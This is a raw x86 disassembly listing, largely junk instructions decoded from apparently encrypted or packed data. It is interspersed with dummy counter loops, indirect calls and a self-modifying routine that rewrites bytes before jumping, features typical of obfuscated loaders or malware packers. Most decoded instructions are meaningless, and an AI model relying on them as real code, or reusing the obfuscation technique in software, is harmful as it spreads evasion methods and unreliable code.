  4062e0:	sti    
  4062e1:	outs   dx,BYTE PTR fs:[esi]
  4062e3:	icebp  
  4062e4:	(bad)  
  4062e6:	xchg   edx,eax
  4062e7:	add    DWORD PTR [ebx+esi*2+0x74],eax
  4062eb:	add    edi,DWORD PTR [edi-0x52]
  4062ee:	or     al,0x9b
  4062f0:	in     eax,0x8a
  4062f2:	int    0x92
  4062f4:	mov    ebp,0x821a7685
  4062f9:	sbb    eax,0x874bb4fd
  4062fe:	retf   
  4062ff:	jo     0x40634e
  406301:	mov    ecx,0xca58a4f3
  406307:	sub    al,0x5a
  406309:	dec    esi
  40630a:	cmc    
  40630b:	aam    0xfb
  40630d:	jg     0x406312
  40630f:	(bad)  
  406310:	leave  
  406311:	mov    al,ds:0x6cc692f7
  406316:	fs scas eax,DWORD PTR es:[edi]
  406318:	and    esi,DWORD PTR [edi-0x540808ea]
  40631e:	pop    esp
  40631f:	cli    
  406320:	fcom   QWORD PTR [ecx-0x5761d3c]
  406326:	bound  eax,QWORD PTR [eax+0x68]
  406329:	rcl    BYTE PTR [ebp-0x45de0169],1
  40632f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406330:	cmc    
  406331:	ins    BYTE PTR es:[edi],dx
  406332:	adc    bl,BYTE PTR [esi]
  406334:	(bad)  [ecx-0x39]
  406337:	add    DWORD PTR [edi-0x4028ed11],ebp
  40633d:	imul   esp,DWORD PTR [ecx],0xffffffc1
  406340:	pop    esi
  406341:	aam    0x27
  406343:	mov    esi,0x1e136b0d
  406348:	fwait
  406349:	mov    ds:0x5d2dc5f7,eax
  40634e:	jecxz  0x406385
  406350:	retf   
  406351:	jno    0x4063ba
  406353:	xchg   BYTE PTR [ebx-0x4d1d94e2],cl
  406359:	in     eax,dx
  40635a:	mov    ?,edx
  40635c:	mov    gs,WORD PTR [eax]
  40635e:	xchg   edi,eax
  40635f:	popa   
  406360:	add    al,0xae
  406362:	jae    0x4063a9
  406364:	dec    ebp
  406365:	pop    es
  406366:	and    eax,0x165fa2ed
  40636b:	scas   eax,DWORD PTR es:[edi]
  40636c:	sar    BYTE PTR [ebx],cl
  40636e:	cwde   
  40636f:	adc    ebp,DWORD PTR [eax]
  406371:	push   edx
  406372:	pop    eax
  406373:	mov    bl,0xeb
  406375:	div    DWORD PTR [eax-0xe]
  406378:	data16 ficomp DWORD PTR ds:0x5a843c8c
  40637f:	aad    0xc2
  406381:	or     eax,0x7e94eb83
  406386:	sbb    dh,dl
  406388:	inc    ebx
  406389:	xchg   edi,eax
  40638a:	lds    ecx,FWORD PTR [ebp-0x50758f7c]
  406390:	mov    al,ds:0x290b451b
  406395:	bound  edx,QWORD PTR [edx-0x62]
  406398:	xor    al,0x1f
  40639a:	adc    BYTE PTR [ebx+0x18f66f34],dh
  4063a0:	inc    edx
  4063a1:	add    BYTE PTR [ebx],ch
  4063a3:	sub    DWORD PTR [ebx-0x251e8cb7],esp
  4063a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063aa:	and    edx,eax
  4063ac:	mov    ah,0xfb
  4063ae:	mov    dl,0xbc
  4063b0:	push   ebx
  4063b1:	test   DWORD PTR [edx+0x7fc183be],ebx
  4063b7:	sahf   
  4063b8:	push   DWORD PTR [ebp-0xc]
  4063bb:	push   DWORD PTR [ebp-0x14]
  4063be:	jmp    0x4065b6
  4063c3:	push   edi
  4063c4:	mov    bh,BYTE PTR [esi+0x51514381]
  4063ca:	dec    eax
  4063cb:	sub    DWORD PTR [eax],eax
  4063cd:	enter  0xa5e0,0x52
  4063d1:	mov    bh,0x9a
  4063d3:	aam    0x31
  4063d5:	jle    0x406455
  4063d7:	push   ebp
  4063d8:	jg     0x406458
  4063da:	jle    0x40637c
  4063dc:	pop    es
  4063dd:	repz pop esp
  4063df:	in     al,0xd8
  4063e1:	pop    esi
  4063e2:	xchg   esi,eax
  4063e3:	xchg   ecx,eax
  4063e4:	push   cs
  4063e5:	fadd   st(3),st
  4063e7:	jb     0x40645e
  4063e9:	xchg   edx,eax
  4063ea:	shl    BYTE PTR [ebx],0x39
  4063ed:	mov    esp,0xf735d065
  4063f2:	sub    eax,eax
  4063f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4063f5:	rcr    esp,0x95
  4063f8:	mov    ds:0xb1d8103,al
  4063fd:	push   ss
  4063fe:	jbe    0x40643d
  406400:	cmp    BYTE PTR [edx+0x23],0x42
  406404:	adc    al,0x5e
  406406:	loopne 0x406477
  406408:	dec    esi
  406409:	or     al,0x55
  40640b:	mov    dl,0xad
  40640d:	push   esp
  40640e:	out    dx,al
  40640f:	sbb    DWORD PTR [edi+edi*8-0x15f985bd],edx
  406416:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406417:	(bad)  
  406418:	dec    edi
  406419:	fidiv  WORD PTR [edi-0x6c8f4fd2]
  40641f:	xor    eax,0xaf6eeab0
  406424:	mov    edx,0x3dc518c
  406429:	ins    BYTE PTR es:[edi],dx
  40642a:	ins    DWORD PTR es:[edi],dx
  40642b:	mov    eax,ds:0x10179c4d
  406430:	ja     0x406423
  406432:	(bad)  ds:0x1f158f2a
  406438:	outs   dx,BYTE PTR ds:[esi]
  406439:	mov    bh,0x36
  40643b:	ins    BYTE PTR es:[edi],dx
  40643c:	dec    ecx
  40643d:	cmp    BYTE PTR [ecx+0x118497a4],cl
  406443:	enter  0x367,0xc8
  406447:	mov    bl,0x4e
  406449:	sbb    DWORD PTR [ecx+0x69],ebp
  40644c:	inc    ebp
  40644d:	inc    ecx
  40644e:	cmc    
  40644f:	in     al,0x1f
  406451:	jmp    0xff6acb12
  406456:	cmp    ah,BYTE PTR [esi-0x8c828b1]
  40645c:	aad    0x91
  40645e:	mov    DWORD PTR [edx+0x2be81c0a],ebx
  406464:	jns    0x4064a4
  406466:	arpl   WORD PTR [ebx],si
  406468:	fbld   TBYTE PTR [ebx-0x31]
  40646b:	in     eax,dx
  40646c:	ja     0x40644a
  40646e:	aas    
  40646f:	inc    edi
  406470:	loop   0x4064d2
  406472:	pop    edi
  406473:	mov    edx,0x59dc5d88
  406478:	mov    ds:0x1c20a746,eax
  40647d:	repnz adc dh,BYTE PTR [ecx+ecx*2+0x2a61c931]
  406485:	(bad)  
  406486:	cwde   
  406487:	(bad)  
  406488:	pop    eax
  406489:	mov    edi,0xb8836b26
  40648f:	xchg   ebp,eax
  406490:	xor    BYTE PTR [edx+0x26],cl
  406493:	pop    esp
  406494:	lods   eax,DWORD PTR ds:[esi]
  406495:	adc    eax,0x7da7824c
  40649a:	in     eax,0x7a
  40649c:	das    
  40649d:	nop
  40649e:	and    BYTE PTR [edx-0x64dc605e],dl
  4064a4:	inc    edi
  4064a5:	repz ficom DWORD PTR [eax-0x79]
  4064a9:	xchg   ebx,eax
  4064aa:	and    DWORD PTR [edi-0x28e3b480],ecx
  4064b0:	pop    ecx
  4064b1:	mov    bl,dl
  4064b3:	shr    BYTE PTR [eax],0xb7
  4064b6:	add    eax,0xdb4f7b08
  4064bb:	loop   0x406522
  4064bd:	fdiv   DWORD PTR [edx+0x35b08ab8]
  4064c3:	mov    al,0x3e
  4064c5:	sahf   
  4064c6:	dec    eax
  4064c7:	push   esi
  4064c8:	pop    esp
  4064c9:	push   ecx
  4064ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064cb:	add    DWORD PTR [edx+0x6f],0xb9cf653a
  4064d2:	aaa    
  4064d3:	jmp    0xa6a:0xfdd15bec
  4064da:	in     eax,dx
  4064db:	icebp  
  4064dc:	dec    ebp
  4064dd:	sbb    esp,ebx
  4064df:	aaa    
  4064e0:	cmp    BYTE PTR [eax-0x3a1eebb1],al
  4064e6:	inc    esp
  4064e7:	mov    eax,ds:0x26727b2e
  4064ec:	xchg   esp,eax
  4064ed:	fs mov ebx,0xaa1f908
  4064f3:	test   DWORD PTR [ecx-0x38097c70],edi
  4064f9:	and    dh,0x59
  4064fc:	cmp    al,0x1c
  4064fe:	xchg   esp,eax
  4064ff:	jp     0x40654d
  406501:	loope  0x406489
  406503:	jmp    0x9ae:0x3c3e40b1
  40650a:	push   cs
  40650b:	pop    eax
  40650c:	cmc    
  40650d:	in     eax,0x6f
  40650f:	mov    esi,0x73c2fe21
  406514:	mov    dh,0x4c
  406516:	mov    BYTE PTR [ecx],dl
  406518:	cdq    
  406519:	pop    eax
  40651a:	lahf   
  40651b:	jbe    0x406546
  40651d:	stos   BYTE PTR es:[edi],al
  40651e:	xor    edi,eax
  406520:	push   cs
  406521:	adc    eax,0xdbad5110
  406526:	push   es
  406527:	js     0x4064c2
  406529:	xchg   ebx,eax
  40652a:	fwait
  40652b:	mov    al,0x6e
  40652d:	cmp    dh,BYTE PTR [esi]
  40652f:	test   al,0x1b
  406531:	mov    edi,0x35533aaa
  406536:	in     eax,dx
  406537:	neg    esi
  406539:	and    al,0x95
  40653b:	icebp  
  40653c:	fstp   QWORD PTR [eax-0x6eceb2b1]
  406542:	pop    ecx
  406543:	mov    edi,0x6ae64c59
  406548:	icebp  
  406549:	ss jmp 0x9fba:0x754ce403
  406551:	in     eax,dx
  406552:	out    dx,al
  406553:	mov    esp,DWORD PTR [eax+0x6]
  406556:	imul   bh
  406558:	imul   edx,edx,0x18
  40655b:	iret   
  40655c:	dec    ebx
  40655d:	mov    WORD PTR [edx],es
  40655f:	retf   0x951c
  406562:	fwait
  406563:	xchg   edi,eax
  406564:	aas    
  406565:	and    BYTE PTR [esi+0x71e729a4],0xe9
  40656c:	es loope 0x406511
  40656f:	and    BYTE PTR ds:0xf0a75823,al
  406575:	and    eax,0xdadc70c9
  40657a:	loop   0x40655c
  40657c:	lock inc eax
  40657e:	push   ebx
  40657f:	adc    al,0x4e
  406581:	out    dx,al
  406582:	xor    DWORD PTR [edx+0x34],0x4e15c1cd
  406589:	add    al,ch
  40658b:	adc    al,BYTE PTR ds:0x7baf6b79
  406591:	and    bh,BYTE PTR [ebp+0x2a]
  406594:	(bad)  
  406595:	mov    bh,0xf9
  406597:	pop    ebp
  406598:	sub    cl,BYTE PTR [esi+ecx*8+0x1a]
  40659c:	xchg   ebp,eax
  40659d:	mov    ecx,0x3194a42b
  4065a2:	and    esi,DWORD PTR [ecx-0x4c]
  4065a5:	mov    edi,0xebbad461
  4065aa:	pop    ecx
  4065ab:	cwde   
  4065ac:	adc    al,0x67
  4065ae:	and    al,0x15
  4065b0:	mov    al,ds:0x2843e18c
  4065b5:	jae    0x40659f
  4065b7:	mov    fs,edi
  4065b9:	(bad)  
  4065ba:	inc    DWORD PTR [ebp+0x25840fc0]
  4065c0:	add    BYTE PTR [eax],al
  4065c2:	add    BYTE PTR [ebp-0x74af77bb],cl
  4065c8:	inc    ebp
  4065c9:	in     al,dx
  4065ca:	xor    eax,esi
  4065cc:	add    eax,edi
  4065ce:	push   eax
  4065cf:	mov    eax,DWORD PTR [ebp-0x10]
  4065d2:	add    eax,0xee
  4065d7:	push   eax
  4065d8:	mov    eax,DWORD PTR [ebp-0x10]
  4065db:	mov    eax,DWORD PTR [eax+0x198]
  4065e1:	push   DWORD PTR [eax]
  4065e3:	call   0x40cdc5
  4065e8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4065eb:	xor    ecx,esi
  4065ed:	jmp    0x4067e5
  4065f2:	fwait
  4065f3:	imul   edx,eax,0x42
  4065f6:	shl    BYTE PTR [ecx-0x57],1
  4065f9:	jae    0x406585
  4065fb:	sbb    edi,DWORD PTR [edx+edx*1+0xd9bcea8]
  406602:	sub    edi,DWORD PTR [edi]
  406604:	jle    0x406684
  406606:	push   ebp
  406607:	jg     0x406687
  406609:	jle    0x406597
  40660b:	cld    
  40660c:	mov    bl,0x40
  40660e:	sbb    esp,eax
  406610:	add    BYTE PTR [ebx+0x52d9665e],dl
  406616:	inc    esp
  406617:	gs cmc 
  406619:	pop    esp
  40661a:	pop    esi
  40661b:	sbb    DWORD PTR [edx],esi
  40661d:	test   DWORD PTR [ecx+0xca0ef58],0xbb120ed
  406627:	iret   
  406628:	test   DWORD PTR [eax+0x39],edx
  40662b:	inc    edx
  40662c:	call   0x784a8307
  406631:	aam    0x69
  406633:	jg     0x406698
  406635:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406636:	jno    0x40669d
  406638:	(bad)  
  406639:	inc    ecx
  40663a:	push   es
  40663b:	pop    ecx
  40663c:	xchg   esi,ebp
  40663e:	outs   dx,BYTE PTR ds:[esi]
  40663f:	adc    eax,0xcc20761
  406644:	push   edx
  406645:	sbb    eax,0x9601fdb7
  40664a:	out    0xe6,eax
  40664c:	xchg   esp,eax
  40664d:	dec    ebp
  40664e:	and    bh,0xf2
  406651:	ja     0x4066a0
  406653:	lods   eax,DWORD PTR ds:[esi]
  406654:	cmp    edi,DWORD PTR [edx-0x6]
  406657:	pop    edx
  406658:	test   al,0x6e
  40665a:	ja     0x40666c
  40665c:	xchg   BYTE PTR [eax+0x6c9cad56],bl
  406662:	mov    ds:0x72ea36f9,eax
  406667:	imul   eax,DWORD PTR [ebp+0x4bd8b207],0x1088a6a3
  406671:	rol    ah,cl
  406673:	push   ebp
  406674:	mov    eax,ds:0x3373e68b
  406679:	ss pop ds
  40667b:	popf   
  40667c:	test   DWORD PTR [ebx+esi*2+0x7df88c29],ebx
  406683:	cmp    eax,0x721a4a80
  406688:	cmp    eax,0xc7fa7b4e
  40668d:	xlat   BYTE PTR ds:[ebx]
  40668e:	and    esi,esp
  406690:	jmp    0xef4a0306
  406695:	sbb    al,0xb
  406697:	xor    BYTE PTR [eax],al
  406699:	das    
  40669a:	std    
  40669b:	push   0xfa0011ad
  4066a0:	out    0xa,al
  4066a2:	or     DWORD PTR [ebx],0x7f
  4066a5:	out    dx,eax
  4066a6:	clc    
  4066a7:	jo     0x4066cb
  4066a9:	push   esi
  4066aa:	inc    esp
  4066ab:	lods   al,BYTE PTR ds:[esi]
  4066ac:	pop    esp
  4066ad:	ds xchg ebp,eax
  4066af:	mov    edi,DWORD PTR [edi+edi*1+0x73748e9d]
  4066b6:	cmp    BYTE PTR [ebp+0x67],bl
  4066b9:	xchg   edi,eax
  4066ba:	sbb    bl,0x3b
  4066bd:	mov    al,0x5
  4066bf:	pop    ebp
  4066c0:	mov    edi,0x84eb2980
  4066c5:	and    eax,DWORD PTR [ecx+eiz*1+0x12107b5b]
  4066cc:	and    BYTE PTR [esp+esi*4-0x5ad6b61b],bl
  4066d3:	sub    edi,DWORD PTR [eax+0x48]
  4066d6:	ja     0x4066d2
  4066d8:	loope  0x4066e1
  4066da:	jo     0x4066da
  4066dc:	fistp  WORD PTR [eax+0x7]
  4066df:	dec    ebp
  4066e0:	jns    0x40666c
  4066e2:	daa    
  4066e3:	leave  
  4066e4:	mov    ebp,0x1ce49a3d
  4066e9:	call   0xc0a0d2ca
  4066ee:	or     eax,0x96ce65e7
  4066f3:	out    0x40,al
  4066f5:	add    ah,bl
  4066f7:	ja     0x40672a
  4066f9:	ret    
  4066fa:	dec    ecx
  4066fb:	add    edx,DWORD PTR [edx+ecx*4+0x4ee9a35d]
  406702:	mov    bl,cl
  406704:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406705:	jo     0x406725
  406707:	fwait
  406708:	inc    eax
  406709:	mov    cl,0x59
  40670b:	pop    ecx
  40670c:	sbb    esi,ecx
  40670e:	pusha  
  40670f:	ss push 0x5b9dc981
  406715:	inc    ecx
  406716:	jmp    0x406774
  406718:	and    BYTE PTR [eax+0x49],bl
  40671b:	bound  esp,QWORD PTR [esi+0x68]
  40671e:	adc    ebp,DWORD PTR [esi+0x18800bb7]
  406724:	test   BYTE PTR [esi+0x5b68d96b],ah
  40672a:	push   es
  40672b:	enter  0xaac3,0x89
  40672f:	retf   0x87a5
  406732:	xchg   bh,dh
  406734:	js     0x406751
  406736:	dec    edx
  406737:	ja     0x40672c
  406739:	test   DWORD PTR ss:[eax-0x2e],ebp
  40673d:	jle    0x4066f2
  40673f:	mov    ecx,0x3077387f
  406744:	push   ebx
  406745:	push   esp
  406746:	(bad)  
  406747:	ror    DWORD PTR [ebx-0x63],1
  40674a:	aam    0x27
  40674c:	adc    DWORD PTR [edi-0x663d94e0],0xffffff9d
  406753:	inc    esp
  406754:	ja     0x40679f
  406756:	lds    ebx,FWORD PTR [ebx-0xb]
  406759:	iret   
  40675a:	psrlw  mm5,QWORD PTR [eax-0x46]
  40675e:	sbb    eax,0x8911175a
  406763:	fadd   QWORD PTR [ecx+0xe9f0fa7]
  406769:	sbb    edi,esi
  40676b:	aaa    
  40676c:	in     al,dx
  40676d:	fwait
  40676e:	mov    al,0xc7
  406770:	inc    eax
  406771:	jmp    0x822d:0xe22cba52
  406778:	and    DWORD PTR [esi-0x7532a860],edi
  40677e:	icebp  
  40677f:	into   
  406780:	fistp  WORD PTR [esi-0x53]
  406783:	pop    esi
  406784:	je     0x40671f
  406786:	es mov ebp,0x832b0ed8
  40678c:	xchg   edi,eax
  40678d:	and    ecx,ebp
  40678f:	(bad)  
  406790:	cli    
  406791:	sub    bl,ah
  406793:	cli    
  406794:	out    dx,al
  406795:	mov    bl,0x5a
  406797:	lea    edx,[ecx]
  406799:	jecxz  0x4067f6
  40679b:	(bad)  
  40679d:	inc    eax
  40679e:	jmp    0x9e3d81e7
  4067a3:	inc    edi
  4067a4:	pop    ds
  4067a5:	add    bh,al
  4067a7:	xor    DWORD PTR [ecx],ebx
  4067a9:	pop    esi
  4067aa:	push   esi
  4067ab:	cmp    DWORD PTR [ebx+0x6b551e38],esi
  4067b1:	cmp    al,0xa2
  4067b3:	add    al,0x44
  4067b5:	clc    
  4067b6:	aam    0x68
  4067b8:	push   esi
  4067b9:	push   ecx
  4067ba:	and    eax,DWORD PTR ds:0x99ba566d
  4067c0:	dec    esp
  4067c1:	xor    DWORD PTR [edx-0x60],eax
  4067c4:	push   edx
  4067c5:	mov    ah,0x5
  4067c7:	inc    edi
  4067c8:	mov    dh,0xc4
  4067ca:	xchg   edx,eax
  4067cb:	sbb    ebx,esp
  4067cd:	pusha  
  4067ce:	sub    bl,BYTE PTR [ebx-0x3e048249]
  4067d4:	aas    
  4067d5:	ret    
  4067d6:	dec    ebp
  4067d7:	dec    ebx
  4067d8:	xor    eax,0xf9e93fa4
  4067dd:	cld    
  4067de:	jbe    0x4067f7
  4067e0:	xor    eax,0x7c02ab09
  4067e5:	mov    eax,0xffcd8d65
  4067ea:	sub    eax,ecx
  4067ec:	sub    eax,DWORD PTR [ebp-0x8]
  4067ef:	mov    ecx,DWORD PTR [ebp-0x30]
  4067f2:	add    ecx,eax
  4067f4:	mov    eax,DWORD PTR [ebp-0x8]
  4067f7:	mov    DWORD PTR [eax+0x1],ecx
  4067fa:	mov    al,BYTE PTR [ebp-0x1]
  4067fd:	mov    ecx,DWORD PTR [ebp-0x8]
  406800:	xor    al,0x46
  406802:	sub    al,0x38
  406804:	mov    BYTE PTR [ecx],al
  406806:	lea    eax,[ebp-0x8]
  406809:	inc    BYTE PTR [eax]
  40680b:	inc    eax
  40680c:	push   eax
  40680d:	pop    ecx
  40680e:	dec    ecx
  40680f:	xchg   ecx,edx
  406811:	dec    BYTE PTR [edx]
  406813:	push   DWORD PTR [ebp-0x10]
  406816:	mov    eax,ds:0x412264
  40681b:	mov    eax,DWORD PTR [eax]
  40681d:	push   DWORD PTR [eax]
  40681f:	lea    eax,ds:0x412280
  406825:	push   DWORD PTR [eax]
  406827:	lea    eax,ds:0x41202c
  40682d:	push   DWORD PTR [eax]
  40682f:	lea    eax,ds:0x412260
  406835:	push   DWORD PTR [eax]
  406837:	lea    eax,ds:0x4122f4
  40683d:	push   DWORD PTR [eax]
  40683f:	xchg   ebx,edx
  406841:	inc    ebx
  406842:	inc    ebx
  406843:	sub    ebx,0x3
  406846:	push   ebx
  406847:	jmp    0x406a3f
  40684c:	xchg   edx,eax
  40684d:	lods   al,BYTE PTR ds:[esi]
  40684e:	sbb    eax,0x91ab211a
  406853:	mov    ah,0x54
  406855:	jmp    0x946d:0xeea6f6f1
  40685c:	push   cs
  40685d:	cmp    eax,0x7f557e7e
  406862:	jle    0x4068e2
  406864:	xchg   edi,eax
  406865:	mov    esp,0xfb7a2b47
  40686a:	ret    
  40686b:	adc    ebx,DWORD PTR [ebx-0x1e186967]
  406871:	(bad)  
  406872:	shl    DWORD PTR [edx+0x7b],1
  406875:	std    
  406876:	push   esp
  406877:	add    eax,0x2878d365
  40687c:	rcr    eax,0xb9
  40687f:	sub    esi,0x4c6595bb
  406885:	ja     0x40681c
  406887:	(bad)  
  406888:	js     0x4068fd
  40688a:	test   al,0x48
  40688c:	dec    esi
  40688d:	into   
  40688e:	push   ebx
  40688f:	push   edi
  406890:	or     eax,0xa094fce2
  406895:	xor    esi,DWORD PTR [esi+0x7a]
  406898:	and    BYTE PTR [ebx+ebx*1+0x5f],0x16
  40689d:	push   0x5b
  40689f:	fisub  DWORD PTR [ebx-0x410ce7d5]
  4068a5:	and    eax,DWORD PTR [esp+edi*1]
  4068a8:	mov    eax,0xf4e9b493
  4068ad:	sub    DWORD PTR [ebx-0x246596d3],esp
  4068b3:	jle    0x40687b
  4068b5:	ins    DWORD PTR es:[edi],dx
  4068b6:	pop    edx
  4068b7:	aam    0xf8
  4068b9:	test   eax,0xad27a8cd
  4068be:	jae    0x406868
  4068c0:	(bad)  
  4068c2:	out    dx,al
  4068c3:	add    al,0xd9
  4068c5:	sub    BYTE PTR ds:0x2d9d9d4c,dl
  4068cb:	shl    BYTE PTR [esi+0x10],1
  4068ce:	sahf   
  4068cf:	or     ebx,edi
  4068d1:	pushf  
  4068d2:	in     al,0x45
  4068d4:	mov    dl,BYTE PTR [ecx-0x52bed8e8]
  4068da:	adc    al,0xef
  4068dc:	daa    
  4068dd:	retf   
  4068de:	inc    esp
  4068df:	into   
  4068e0:	fwait
  4068e1:	inc    esi
  4068e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4068e3:	add    eax,0xbfc11557
  4068e8:	mov    esp,0x9617ea4
  4068ed:	jecxz  0x40692c
  4068ef:	iret   
  4068f0:	gs into 
  4068f2:	inc    edx
  4068f3:	pop    ebx
  4068f4:	push   cs
  4068f5:	mov    eax,0xe5c9655f
  4068fa:	xlat   BYTE PTR ds:[ebx]
  4068fb:	sub    eax,0x991351ad
  406900:	fisub  WORD PTR [eax]
  406902:	pushf  
  406903:	test   DWORD PTR [ecx],ebp
  406905:	mov    al,ds:0xe48bdfbd
  40690a:	jb     0x4068d2
  40690c:	cdq    
  40690d:	push   edi
  40690e:	mov    edx,DWORD PTR [esi+eax*4+0x31e6ed8c]
  406915:	cli    
  406916:	loop   0x406901
  406918:	mov    eax,DWORD PTR [ebx-0x1c8e6436]
  40691e:	dec    eax
  40691f:	das    
  406920:	stc    
  406921:	sub    ch,ch
  406923:	ja     0x40696e
  406925:	mov    bl,0xb5
  406927:	stc    
  406928:	out    0xc2,eax
  40692a:	xor    eax,0x37f1ec3b
  40692f:	mov    BYTE PTR [ecx],bl
  406931:	clc    
  406932:	scas   eax,DWORD PTR es:[edi]
  406933:	sub    BYTE PTR [eax-0x2e],ch
  406936:	inc    esp
  406937:	test   al,0xd5
  406939:	push   edx
  40693a:	fwait
  40693b:	jmp    0xbcf94a6d
  406940:	or     BYTE PTR [esi+0x73],cl
  406943:	pop    edx
  406944:	sub    dh,BYTE PTR [ecx+0x741e8720]
  40694a:	lds    edx,FWORD PTR [edi]
  40694c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40694d:	fmul   QWORD PTR [eax]
  40694f:	jp     0x406981
  406951:	arpl   WORD PTR [ebp-0x617788ed],si
  406957:	push   edi
  406958:	(bad)  
  406959:	iret   
  40695a:	add    bl,BYTE PTR [esi+0x1496c4b1]
  406960:	mov    BYTE PTR [ebx+ebp*1],al
  406963:	push   ss
  406964:	loopne 0x4069a2
  406966:	xchg   esp,eax
  406967:	cmp    al,0xc5
  406969:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40696a:	dec    ecx
  40696b:	popa   
  40696c:	es stc 
  40696e:	pop    edi
  40696f:	and    edi,DWORD PTR [edx-0x67a7bd30]
  406975:	inc    edx
  406976:	push   ds
  406977:	dec    ax
  406979:	cld    
  40697a:	mov    dh,0x3f
  40697c:	inc    BYTE PTR [edx]
  40697e:	bound  eax,QWORD PTR [edx]
  406980:	mov    bl,0xf3
  406982:	test   al,0xc5
  406984:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406985:	sub    dh,ch
  406987:	add    esi,DWORD PTR [ebx]
  406989:	sub    edx,DWORD PTR [eax]
  40698b:	jmp    0x694f:0xaa3e74e8
  406992:	cmp    dl,BYTE PTR ds:0xa48023bb
  406998:	or     DWORD PTR [esi+0x3c],esi
  40699b:	adc    al,0x1
  40699d:	test   al,0x7b
  40699f:	out    0xb6,eax
  4069a1:	adc    cl,BYTE PTR [eax-0x7def889e]
  4069a7:	or     al,0xde
  4069a9:	mov    fs,ebp
  4069ab:	and    al,0x3a
  4069ad:	mov    edx,0x4d02059d
  4069b2:	lahf   
  4069b3:	hlt    
  4069b4:	retf   0xf306
  4069b7:	pop    ebx
  4069b8:	jg     0x4069e4
  4069ba:	fisttp QWORD PTR [ebx-0x13e8eee0]
  4069c0:	sbb    ebp,DWORD PTR [esi-0x1aeb0636]
  4069c6:	xlat   BYTE PTR ds:[ebx]
  4069c7:	ds repnz retf 0x7d3b
  4069cc:	mov    dl,0xa3
  4069ce:	(bad)  
  4069cf:	sub    ebx,esi
  4069d1:	arpl   bx,di
  4069d3:	mov    ah,0x35
  4069d5:	push   esp
  4069d6:	clc    
  4069d7:	cdq    
  4069d8:	xor    edi,DWORD PTR [ecx]
  4069da:	add    DWORD PTR [ebx],0x2c8df764
  4069e0:	push   0x18a26260
  4069e5:	fsub   st,st(6)
  4069e7:	inc    esi
  4069e8:	add    ebx,DWORD PTR [ecx+edi*2-0x3d02e5ea]
  4069ef:	or     BYTE PTR [esi],bh
  4069f1:	push   cs
  4069f2:	sbb    BYTE PTR [edx-0x5f],ch
  4069f5:	inc    ecx
  4069f6:	data16 jle 0x40699e
  4069f9:	cmp    dh,BYTE PTR [esi]
  4069fb:	adc    eax,0x6934e756
  406a00:	loope  0x4069b5
  406a02:	cmp    al,dl
  406a04:	stos   DWORD PTR es:[edi],eax
  406a05:	ror    BYTE PTR [esi-0x26],cl
  406a08:	push   esp
  406a09:	sbb    eax,0x5b2e0fd9
  406a0e:	loop   0x40699e
  406a10:	outs   dx,DWORD PTR ds:[esi]
  406a11:	lods   al,BYTE PTR ds:[esi]
  406a12:	fsubp  st(3),st
  406a14:	xchg   BYTE PTR [eax-0x5d],bh
  406a17:	or     al,0xfe
  406a19:	(bad)  
  406a1a:	fld    TBYTE PTR [ecx+ebp*4+0x653a2cd3]
  406a21:	jg     0x406a11
  406a23:	adc    al,0x16
  406a25:	lods   al,BYTE PTR ds:[esi]
  406a26:	(bad)  
  406a27:	test   al,0x7
  406a29:	ffree  st(1)
  406a2b:	cmp    DWORD PTR [eax-0x7b93a092],eax
  406a31:	fcom   QWORD PTR [esi]
  406a33:	xor    al,0x7
  406a35:	loop   0x406a83
  406a37:	fistp  WORD PTR [edx+eiz*8-0x55b4850d]
  406a3e:	mov    BYTE PTR [eax-0x1],bl
  406a41:	push   eax
  406a42:	add    DWORD PTR [ebx+0xd8be045],ecx
  406a48:	and    al,0x22
  406a4a:	inc    ecx
  406a4b:	add    BYTE PTR [ecx],al
  406a4d:	or     BYTE PTR [edi+0x5e],bl
  406a50:	pop    ebx
  406a51:	leave  
  406a52:	ret    
  406a53:	push   ebp
  406a54:	mov    ebp,esp
  406a56:	sub    esp,0x44
  406a59:	push   edi
  406a5a:	mov    DWORD PTR ds:0x42ec63,0x1a
  406a64:	cmp    DWORD PTR ds:0x42ec63,0x0
  406a6b:	je     0x406ab1
  406a71:	cmp    DWORD PTR ds:0x42ec63,0x25
  406a78:	jne    0x406a8a
  406a7e:	push   DWORD PTR [ebp-0x1c]
  406a81:	push   DWORD PTR [ebp-0x20]
  406a84:	call   DWORD PTR ds:0x42ea9b
  406a8a:	xor    edi,edi
  406a8c:	add    edi,DWORD PTR ds:0x42ec63
  406a92:	dec    edi
  406a93:	mov    DWORD PTR ds:0x42ec63,edi
  406a99:	jmp    0x406a64
  406a9e:	movzx  edi,BYTE PTR ds:0x430367
  406aa5:	xor    edi,DWORD PTR ds:0x4302b5
  406aab:	mov    DWORD PTR ds:0x430367,edi
  406ab1:	mov    eax,DWORD PTR [ebp+0xc]
  406ab4:	and    edx,edi
  406ab6:	mov    DWORD PTR [ebp-0x10],eax
  406ab9:	mov    eax,DWORD PTR [ebp+0x8]
  406abc:	and    DWORD PTR ds:0x4302dd,0x0
  406ac6:	mov    ecx,DWORD PTR ds:0x4302dd
  406acc:	inc    ecx
  406acd:	mov    DWORD PTR ds:0x4302dd,ecx
  406ad3:	cmp    DWORD PTR ds:0x4302dd,0x23
  406ada:	jne    0x406af9
  406ae0:	push   0x42e737
  406ae5:	push   DWORD PTR [ebp-0x28]
  406ae8:	push   DWORD PTR [ebp-0x28]
  406aeb:	push   0x2078
  406af0:	push   DWORD PTR [ebp-0x10]
  406af3:	call   DWORD PTR ds:0x42ea9f
  406af9:	cmp    DWORD PTR ds:0x4302dd,0x1c
  406b00:	jb     0x406ac6
  406b06:	or     edi,0x11f2
  406b0c:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  406b13:	mov    DWORD PTR ds:0x43035f,0x15
  406b1d:	cmp    DWORD PTR ds:0x43035f,0x0
  406b24:	je     0x406b57
  406b2a:	cmp    DWORD PTR ds:0x43035f,0x16
  406b31:	jne    0x406b3d
